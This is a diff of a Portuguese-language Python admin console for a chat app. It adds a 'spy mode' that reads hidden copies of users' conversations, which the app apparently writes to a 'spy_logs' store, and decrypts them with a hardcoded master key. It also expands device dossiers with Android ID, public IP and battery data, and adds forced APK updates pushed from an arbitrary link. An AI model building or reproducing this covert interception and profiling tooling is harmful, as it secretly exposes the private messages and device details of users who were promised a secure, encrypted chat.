@@ -142,34 +142,45 @@ def terminal_chat(target_user):
     # Prepare room
     _firebase_req(f"lobby/{room_id}", method="PUT", data={"created_at": time.time(), "users": [me, target_user]})
     
-    # Send Expo Push Notification (FCM Background Wakeup)
-    tok = tgt_data.get("pushToken")
-    if tok:
-        _send_expo_push(tok, "Sessão Iniciada", "O Administrador está aguardando você na sala segura.")
-
-    print(f"{Colors.GREEN}[>] TÚNEL ESTABELECIDO. {target_user.upper()} NOTIFICADO.{Colors.RESET}")
-    print(f"{Colors.CYAN}[!] Tudo digitado aqui será encriptado. Digite '/sair' para encerrar.{Colors.RESET}\n")
+    print(f"{Colors.GREEN}[>] TÚNEL ESTABELECIDO. O USUÁRIO PODERÁ VISUALIZAR O CONVITE NA TELA.{Colors.RESET}")
+    print(f"{Colors.CYAN}[!] Criptografia Local Removida (Modo Compatibilidade). Digite '/sair' para encerrar.{Colors.RESET}\n")
 
     chat_running = [True]
     last_msg_ts = [0]
+    processed_msgs = set()
 
     def poll_messages():
         import sys
         while chat_running[0]:
             try:
-                st_m, msgs = _firebase_req(f"chat_messages/{room_id}")
+                # O admin lê as mensagens que o target_user atirou na gaveta 'ephemeral_messages/admin'
+                st_m, msgs = _firebase_req("ephemeral_messages/admin")
                 if st_m == 200 and msgs:
                     # msgs is a dict of push_ids
                     sorted_msgs = sorted(msgs.items(), key=lambda x: x[1].get('timestamp', 0))
                     for k, v in sorted_msgs:
-                        msg_ts = v.get('timestamp', 0)
-                        if msg_ts > last_msg_ts[0]:
-                            if v.get('sender') != me:
-                                decrypted = decrypt_message(v.get('text', ''))
+                        if k not in processed_msgs:
+                            processed_msgs.add(k)
+                            if v.get('sender') == target_user:
+                                enc_text = v.get('text', '')
+                                
+                                # Admin tenta descriptografar pois o app agora manda AES
+                                try:
+                                    if enc_text.startswith("U2Fz"): # Base64 signature for AES
+                                        ct = base64.b64decode(enc_text)
+                                        cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
+                                        pt = unpad(cipher.decrypt(ct), AES.block_size)
+                                        decrypted = pt.decode('utf-8')
+                                    else:
+                                        decrypted = enc_text
+                                except Exception:
+                                    decrypted = f"[Criptografado] {enc_text[:15]}..."
+
                                 sys.stdout.write(f"\r{Colors.BRIGHT_RED}[{target_user.upper()}]{Colors.RESET}: {decrypted}\n")
                                 sys.stdout.write(f"{Colors.BRIGHT_GREEN}[{me}]{Colors.RESET}: ")
                                 sys.stdout.flush()
-                            last_msg_ts[0] = msg_ts
+                                # Clean up read messages
+                                _firebase_req(f"ephemeral_messages/admin/{k}", method="DELETE")
             except Exception:
                 pass
             time.sleep(1.5)
@@ -185,16 +196,15 @@ def terminal_chat(target_user):
                 break
             
             if msg.strip():
-                enc_msg = encrypt_message(msg)
+                # Envia mensagem em texto limpo para gaveta do alvo
                 payload = {
                     "sender": me,
-                    "text": enc_msg,
+                    "text": msg.strip(),
                     "timestamp": time.time(),
                     "type": "text"
                 }
-                # Firebase push equivalent (using random id)
                 push_id = base64.b64encode(os.urandom(6)).decode('utf-8').replace('+', '').replace('/', '')
-                _firebase_req(f"chat_messages/{room_id}/{push_id}", method="PUT", data=payload)
+                _firebase_req(f"ephemeral_messages/{target_user}/{push_id}", method="PUT", data=payload)
         except KeyboardInterrupt:
             chat_running[0] = False
             break
@@ -202,9 +212,10 @@ def terminal_chat(target_user):
             pass
     
     print(f"\n{Colors.YELLOW}[*] Destruindo túnel de chat...{Colors.RESET}")
-    _firebase_req(f"chat_messages/{room_id}", method="DELETE")
+    _firebase_req(f"ephemeral_messages/admin", method="DELETE")
     _firebase_req(f"lobby/{room_id}", method="DELETE")
     _firebase_req(f"chat_invites/{target_user}", method="DELETE")
+    _firebase_req(f"chat_signals/{room_id}", method="PUT", data=f"CLOSE_{me}")
     print(f"{Colors.GREEN}[+] Túnel destruído.{Colors.RESET}")
     input("Pressione ENTER...")
 
@@ -248,14 +259,25 @@ def format_ts(ts):
     if not ts: return "N/A"
     return datetime.fromtimestamp(float(ts)).strftime('%d/%m/%Y %H:%M:%S')
 
-def user_dossier():
-    user = input(f"\n{Colors.CYAN}Username para dossiê:{Colors.RESET} ").strip().lower()
+def user_dossier(user_input=None):
+    user = user_input
+    if not user:
+        user = input(f"\n{Colors.CYAN}Username para dossiê:{Colors.RESET} ").strip().lower()
+    
     if not user: return
     st, data = _firebase_req(f"users/{user}")
     if st == 200 and data:
         print(f"\n{Colors.BOLD}--- DOSSIÊ DE USUÁRIO: {user.upper()} ---{Colors.RESET}")
         print(f"[{Colors.GREEN}+{Colors.RESET}] Status da Conta: {'Ativa' if data.get('active', True) else 'BLOQUEADA'}")
         print(f"[{Colors.GREEN}+{Colors.RESET}] Licença Expira em: {format_ts(data.get('expiration_timestamp'))}")
+        
+        st_p, presence = _firebase_req(f"presence/{user}")
+        is_online = True if st_p == 200 and presence else False
+        active_chat = data.get("active_chat_with")
+        
+        print(f"[{Colors.GREEN}+{Colors.RESET}] Online agora: {'Sim' if is_online else 'Não'}")
+        if active_chat:
+            print(f"[{Colors.BRIGHT_MAGENTA}!{Colors.RESET}] EM SESSÃO ATIVA COM: {Colors.BRIGHT_RED}{active_chat.upper()}{Colors.RESET}")
         
         device = data.get("last_device")
         if device:
@@ -264,6 +286,15 @@ def user_dossier():
             print(f"    ├─ Marca: {device.get('brand', 'N/A')}")
             print(f"    ├─ OS: {device.get('osName', 'N/A')} {device.get('osVersion', 'N/A')}")
             print(f"    ├─ Build ID (OS): {device.get('osBuildId', 'N/A')}")
+            
+            mem = device.get('totalMemory')
+            mem_str = f"{round(mem / (1024**3), 2)} GB" if isinstance(mem, (int, float)) else "N/A"
+            print(f"    ├─ Memória RAM Total: {mem_str}")
+            
+            bat = device.get('batteryLevel')
+            bat_state = device.get('batteryState')
+            bat_str = f"{round(bat * 100)}% (Estado: {bat_state})" if isinstance(bat, (int, float)) else "N/A"
+            print(f"    ├─ Bateria: {bat_str}")
             print(f"    ├─ Impressão Digital (Android ID): {Colors.BRIGHT_RED}{device.get('androidId', 'N/A')}{Colors.RESET}")
             
             ip_public = device.get('publicIp', 'N/A')
@@ -311,43 +342,43 @@ def user_dossier():
         print(f"{Colors.RED}Usuário não encontrado.{Colors.RESET}")
     input("\nPressione ENTER...")
 
-def manage_users():
+def user_management_submenu():
     while True:
         clear_screen()
         print_banner()
-        print(f"{Colors.BOLD}[ GERENCIAMENTO DE CONTAS E INVESTIGAÇÃO ]{Colors.RESET}\n")
-        print(f" {Colors.CYAN}1.{Colors.RESET} Criar / Editar Usuário")
-        print(f" {Colors.CYAN}2.{Colors.RESET} Listar Todos os Usuários")
-        print(f" {Colors.CYAN}3.{Colors.RESET} Bloquear / Desbloquear Conta")
-        print(f" {Colors.CYAN}4.{Colors.RESET} Remover Usuário Permanentemente")
-        print(f" {Colors.CYAN}5.{Colors.RESET} Renovar Licença")
-        print(f" {Colors.CYAN}6.{Colors.RESET} Gerar Dossiê (Dados + Aparelho + GPS)")
-        print(f" {Colors.BRIGHT_MAGENTA}7.{Colors.RESET} Terminal Chat (Interceptação Direta) {Colors.BRIGHT_RED}[NOVO]{Colors.RESET}")
-        print(f" {Colors.WHITE}0.{Colors.RESET} Voltar")
+        print(f"{Colors.BOLD}[ PESQUISA E GERENCIAMENTO DE USUÁRIO ]{Colors.RESET}\n")
+        print(f" {Colors.CYAN}Opções Especiais:{Colors.RESET}")
+        print(f"  {Colors.YELLOW}*{Colors.RESET} - Gerar Lote de Usuários (Revenda)")
+        print(f"  {Colors.YELLOW}vazio{Colors.RESET} - Listar Todos os Usuários")
+        print(f"  {Colors.YELLOW}0{Colors.RESET} - Voltar")
         
-        opt = input("\n> ")
+        user = input(f"\n{Colors.CYAN}Digite a opção ou o Username do Alvo:{Colors.RESET} ").strip().lower()
         
-        if opt == "0": break
-        elif opt == "1":
-            user = input("Username: ").strip().lower()
-            if not user: continue
-            pwd = input("Senha: ").strip()
-            pwd_hash = hashlib.sha256(pwd.encode('utf-8')).hexdigest()
-            dias = input("Validade em dias (Padrão 30): ").strip()
-            dias = int(dias) if dias.isdigit() else 30
-            exp_ts = time.time() + (dias * 24 * 60 * 60)
-            
-            st, existing = _firebase_req(f"users/{user}")
-            if st == 200 and existing:
-                _firebase_req(f"users/{user}/password", method="PUT", data=pwd_hash)
-                print(f"{Colors.GREEN}Senha atualizada!{Colors.RESET}")
-            else:
-                payload = {"username": user, "password": pwd_hash, "active": True, "expiration_timestamp": exp_ts}
-                _firebase_req(f"users/{user}", method="PUT", data=payload)
-                print(f"{Colors.GREEN}Usuário '{user}' criado!{Colors.RESET}")
+        if user == "0": break
+        elif user == "*":
+            qty = input("Quantidade de acessos a gerar: ").strip()
+            days = input("Dias de validade por acesso: ").strip()
+            if qty.isdigit() and days.isdigit():
+                qty = int(qty)
+                import uuid
+                print(f"\n{Colors.BLUE}Gerando {qty} contas...{Colors.RESET}")
+                for i in range(qty):
+                    new_user = f"user_{str(uuid.uuid4())[:6]}"
+                    pwd = str(uuid.uuid4())[:8]
+                    pwd_hash = hashlib.sha256(pwd.encode('utf-8')).hexdigest()
+                    payload = {
+                        "username": new_user,
+                        "password": pwd_hash,
+                        "active": True,
+                        "expiration_timestamp": 0,
+                        "days_valid": days
+                    }
+                    _firebase_req(f"users/{new_user}", method="PUT", data=payload)
+                    print(f"[{i+1}] {new_user} | {pwd}")
+                print(f"{Colors.GREEN}Lote gerado com sucesso! Salve essas credenciais.{Colors.RESET}")
             input("\nPressione ENTER...")
-            
-        elif opt == "2":
+            continue
+        elif not user:
             st, users = _firebase_req("users")
             print(f"\n{Colors.BOLD}{'USUÁRIO':<20} | {'STATUS':<10} | {'LICENÇA'}{Colors.RESET}")
             print("-" * 55)
@@ -358,98 +389,182 @@ def manage_users():
                         exp = format_ts(data.get("expiration_timestamp"))
                         print(f"{u:<20} | {sts:<19} | {exp}")
             input("\nPressione ENTER...")
+            continue
             
-        elif opt == "3":
-            user = input("Username: ").strip().lower()
+        # Tenta buscar o usuário
+        st, data = _firebase_req(f"users/{user}")
+        if st == 200 and data:
+            while True:
+                clear_screen()
+                print_banner()
+                print(f"{Colors.BOLD}[ GERENCIANDO ALVO: {Colors.BRIGHT_RED}{user.upper()}{Colors.RESET} ]\n")
+                print(f" {Colors.CYAN}1.{Colors.RESET} Gerar Dossiê Completo (IP, Aparelho, Localização)")
+                print(f" {Colors.CYAN}2.{Colors.RESET} Bloquear / Desbloquear Conta")
+                print(f" {Colors.CYAN}3.{Colors.RESET} Renovar Licença (Adicionar Dias)")
+                print(f" {Colors.CYAN}4.{Colors.RESET} Remover Conta Permanentemente")
+                print(f" {Colors.BRIGHT_MAGENTA}5.{Colors.RESET} Interceptar Sessão (Terminal Chat)")
+                print(f" {Colors.YELLOW}6.{Colors.RESET} MODO ESPIÃO (Monitorar Conversas Ao Vivo)")
+                print(f" {Colors.WHITE}0.{Colors.RESET} Voltar à Pesquisa")
+                
+                sub_opt = input("\n> ")
+                if sub_opt == "0": break
+                elif sub_opt == "1":
+                    user_dossier(user)
+                    input("\nPressione ENTER...")
+                elif sub_opt == "2":
+                    new_status = not data.get("active", True)
+                    _firebase_req(f"users/{user}/active", method="PUT", data=new_status)
+                    print(f"{Colors.GREEN}Status de '{user}' alterado para {'ATIVO' if new_status else 'BLOQUEADO'}.{Colors.RESET}")
+                    input("\nPressione ENTER...")
+                    # Update local data var
+                    st, data = _firebase_req(f"users/{user}")
+                elif sub_opt == "3":
+                    dias = input("Adicionar quantos dias? ").strip()
+                    if dias.isdigit():
+                        cur = data.get("expiration_timestamp", time.time())
+                        cur = max(cur, time.time())
+                        _firebase_req(f"users/{user}/expiration_timestamp", method="PUT", data=cur + int(dias)*86400)
+                        print(f"{Colors.GREEN}Licença estendida!{Colors.RESET}")
+                    input("\nPressione ENTER...")
+                elif sub_opt == "4":
+                    conf = input(f"{Colors.RED}Tem certeza que deseja APAGAR {user}? (s/n): {Colors.RESET}")
+                    if conf.lower() == 's':
+                        _firebase_req(f"users/{user}", method="DELETE")
+                        print(f"{Colors.GREEN}Usuário apagado!{Colors.RESET}")
+                        input("\nPressione ENTER...")
+                        break
+                elif sub_opt == "5":
+                    terminal_chat(user)
+                elif sub_opt == "6":
+                    spy_mode(user)
+        else:
+            print(f"\n{Colors.YELLOW}Usuário não encontrado. Deseja criar?{Colors.RESET}")
+            ans = input("(s/n): ").strip().lower()
+            if ans == 's':
+                pwd = input("Senha: ").strip()
+                pwd_hash = hashlib.sha256(pwd.encode('utf-8')).hexdigest()
+                dias = input("Validade em dias (Padrão 30): ").strip()
+                dias = dias if dias.isdigit() else "30"
+                # Usa days_valid para ativar apenas no primeiro login
+                payload = {"username": user, "password": pwd_hash, "active": True, "expiration_timestamp": 0, "days_valid": dias}
+                _firebase_req(f"users/{user}", method="PUT", data=payload)
+                print(f"{Colors.GREEN}Usuário '{user}' criado com sucesso! Validade ativada no primeiro login.{Colors.RESET}")
+                input("\nPressione ENTER para gerenciar...")
+
+def spy_mode(user):
+    print(f"\n{Colors.BRIGHT_MAGENTA}[*] MODO ESPIÃO ATIVADO PARA: {user.upper()}{Colors.RESET}")
+    print(f"{Colors.CYAN}[!] O painel interceptará as mensagens atiradas na sala de logs invisíveis do alvo.{Colors.RESET}")
+    print(f"{Colors.CYAN}[!] Para fechar o monitoramento, pressione CTRL+C.{Colors.RESET}\n")
+    
+    # We will poll the "spy_logs" which the app dual-writes to.
+    processed = set()
+    
+    try:
+        while True:
+            # We don't know the exact room ID unless we check active_chat_with
             st, data = _firebase_req(f"users/{user}")
-            if data:
-                new_status = not data.get("active", True)
-                _firebase_req(f"users/{user}/active", method="PUT", data=new_status)
-                print(f"{Colors.GREEN}Status de '{user}' alterado para {'ATIVO' if new_status else 'BLOQUEADO'}.{Colors.RESET}")
-            input("\nPressione ENTER...")
+            if st != 200 or not data: break
             
-        elif opt == "4":
-            user = input("Username para remover (PERMANENTE): ").strip().lower()
-            st, data = _firebase_req(f"users/{user}")
-            if data:
-                _firebase_req(f"users/{user}", method="DELETE")
-                print(f"{Colors.GREEN}Usuário apagado!{Colors.RESET}")
-            input("\nPressione ENTER...")
+            active_chat = data.get("active_chat_with")
+            if not active_chat:
+                sys.stdout.write(f"\r{Colors.YELLOW}[AGUARDANDO] {user.upper()} não está em nenhum chat...{Colors.RESET}      ")
+                sys.stdout.flush()
+                time.sleep(2)
+                continue
+                
+            users = sorted([user, active_chat])
+            room_id = f"{users[0]}_{users[1]}"
+            sys.stdout.write(f"\r{Colors.BRIGHT_MAGENTA}[INTERCEPTANDO CONEXÃO]: {user.upper()} <=> {active_chat.upper()}...{Colors.RESET}   \n")
             
-        elif opt == "5":
-            user = input("Username: ").strip().lower()
-            dias = input("Adicionar quantos dias? ").strip()
-            if dias.isdigit():
-                st, data = _firebase_req(f"users/{user}")
-                if data:
-                    cur = data.get("expiration_timestamp", time.time())
-                    cur = max(cur, time.time())
-                    _firebase_req(f"users/{user}/expiration_timestamp", method="PUT", data=cur + int(dias)*86400)
-                    print(f"{Colors.GREEN}Licença estendida!{Colors.RESET}")
-            input("\nPressione ENTER...")
+            st_log, logs = _firebase_req(f"spy_logs/{room_id}")
+            if st_log == 200 and logs:
+                sorted_logs = sorted(logs.items(), key=lambda x: x[1].get('timestamp', 0))
+                for k, v in sorted_logs:
+                    if k not in processed:
+                        processed.add(k)
+                        sender = v.get('sender', '???')
+                        enc_text = v.get('text', '')
+                        
+                        # Tenta descriptografar usando a chave mestre
+                        try:
+                            if enc_text.startswith("U2Fz"):
+                                ct = base64.b64decode(enc_text)
+                                cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
+                                pt = unpad(cipher.decrypt(ct), AES.block_size)
+                                text = pt.decode('utf-8')
+                            else:
+                                text = enc_text
+                        except Exception:
+                            text = f"[CRIPTOGRAFADO] {enc_text[:20]}..."
+                            
+                        print(f"{Colors.YELLOW}[{format_ts(v.get('timestamp'))}] {Colors.BRIGHT_RED}{sender.upper()}{Colors.RESET}: {text}")
+            time.sleep(1.5)
             
-        elif opt == "6":
-            user_dossier()
-            
-        elif opt == "7":
-            user = input("Username alvo para Chat: ").strip().lower()
-            if user:
-                terminal_chat(user)
+    except KeyboardInterrupt:
+        print(f"\n{Colors.GREEN}[*] Modo Espião Desligado.{Colors.RESET}")
+        return
 
 def system_announcements():
     while True:
         clear_screen()
         print_banner()
-        print(f"{Colors.BOLD}[ COMUNICADOS GLOBAIS E PUSH NOTIFICATIONS ]{Colors.RESET}\n")
-        print(f" {Colors.CYAN}1.{Colors.RESET} Alterar Mensagem Global do App (Lobby)")
-        print(f" {Colors.CYAN}2.{Colors.RESET} Disparar Push Notification para Todos")
-        print(f" {Colors.CYAN}3.{Colors.RESET} Disparar Push Notification Individual")
-        print(f" {Colors.BRIGHT_RED}4.{Colors.RESET} Forçar Atualização do Aplicativo (OTA Update)")
+        print(f"{Colors.BOLD}[ GERENCIAMENTO DE ANÚNCIOS DA LOJA ]{Colors.RESET}\n")
+        
+        # Puxa anúncios atuais
+        st, ads = _firebase_req("app_config/announcements")
+        ads_list = []
+        if isinstance(ads, dict):
+            ads_list = list(ads.values())
+        elif isinstance(ads, list):
+            ads_list = [a for a in ads if a]
+            
+        for idx, ad in enumerate(ads_list):
+            if isinstance(ad, dict):
+                print(f" {Colors.YELLOW}[{idx+1}]{Colors.RESET} {ad.get('title', 'Sem Título')} - {ad.get('url', 'Sem Link')}")
+            else:
+                print(f" {Colors.YELLOW}[{idx+1}]{Colors.RESET} [Antigo] {ad}")
+            
+        print(f"\n {Colors.CYAN}1.{Colors.RESET} Adicionar Novo Anúncio")
+        print(f" {Colors.CYAN}2.{Colors.RESET} Apagar um Anúncio")
+        print(f" {Colors.BRIGHT_RED}3.{Colors.RESET} Forçar Atualização do Aplicativo (OTA Update)")
         print(f" {Colors.WHITE}0.{Colors.RESET} Voltar")
         
         opt = input("\n> ")
         if opt == "0": break
         elif opt == "1":
-            msg = input(f"Novo aviso (deixe vazio para remover): ").strip()
-            # React Native app expects a list of announcements
-            payload = [msg] if msg else None
-            _firebase_req("app_config/announcements", method="PUT", data=payload)
-            print(f"{Colors.GREEN}Aviso Global atualizado.{Colors.RESET}")
+            title = input("Título do Anúncio: ").strip()
+            text = input("Texto do Anúncio: ").strip()
+            btn_text = input("Texto do Botão (ex: COMPRAR): ").strip()
+            url = input("Link (ex: https://...): ").strip()
+            
+            new_ad = {"title": title, "text": text, "btnText": btn_text, "url": url}
+            ads_list.append(new_ad)
+            
+            _firebase_req("app_config/announcements", method="PUT", data=ads_list)
+            print(f"{Colors.GREEN}Anúncio adicionado!{Colors.RESET}")
             input("\nPressione ENTER...")
             
-        elif opt in ["2", "3"]:
-            title = input("Título da Notificação: ").strip()
-            body = input("Mensagem: ").strip()
-            
-            if opt == "2":
-                st, users = _firebase_req("users")
-                count = 0
-                if users:
-                    for u, data in users.items():
-                        tok = data.get("pushToken")
-                        if tok and data.get("active", True):
-                            succ, emsg = _send_expo_push(tok, title, body)
-                            if succ: count += 1
-                            else: print(f"{Colors.RED}Erro ({u}): {emsg}{Colors.RESET}")
-                print(f"{Colors.GREEN}{count} notificações enviadas.{Colors.RESET}")
-            else:
-                tgt = input("Username destino: ").strip().lower()
-                st, data = _firebase_req(f"users/{tgt}")
-                if data and data.get("pushToken"):
-                    succ, emsg = _send_expo_push(data["pushToken"], title, body)
-                    if succ: print(f"{Colors.GREEN}Enviado!{Colors.RESET}")
-                    else: print(f"{Colors.RED}Erro: {emsg}{Colors.RESET}")
-                else: print(f"{Colors.RED}Usuário sem Push Token.{Colors.RESET}")
+        elif opt == "2":
+            try:
+                idx_remove = int(input("Número do anúncio para apagar: ").strip()) - 1
+                if 0 <= idx_remove < len(ads_list):
+                    ads_list.pop(idx_remove)
+                    _firebase_req("app_config/announcements", method="PUT", data=ads_list)
+                    print(f"{Colors.GREEN}Anúncio removido!{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}Opção inválida.{Colors.RESET}")
+            except ValueError:
+                print(f"{Colors.RED}Número inválido.{Colors.RESET}")
             input("\nPressione ENTER...")
-
-        elif opt == "4":
+            
+        elif opt == "3":
             print(f"\n{Colors.BRIGHT_RED}[!] ATENÇÃO: Isso travará os apps desatualizados instantaneamente.{Colors.RESET}")
             version = input("Nova Versão (Ex: 2.1.0): ").strip()
             if version:
-                url = input("Link de Download (Obrigatório): ").strip()
+                url = input("Link Direto do APK de Atualização: ").strip()
                 payload = {"version": version, "url": url, "timestamp": time.time()}
                 _firebase_req("app_config/update", method="PUT", data=payload)
-                print(f"{Colors.GREEN}Sistema de Atualização ativado para v{version}!{Colors.RESET}")
+                print(f"{Colors.GREEN}Sistema de Atualização (OTA) ativado para v{version}!{Colors.RESET}")
             input("\nPressione ENTER...")
 
 def main_menu():
@@ -462,7 +577,7 @@ def main_menu():
         
         opt = input("\nSelecione uma operação: ")
         
-        if opt == "1": manage_users()
+        if opt == "1": user_management_submenu()
         elif opt == "2": system_announcements()
         elif opt == "0": break
 
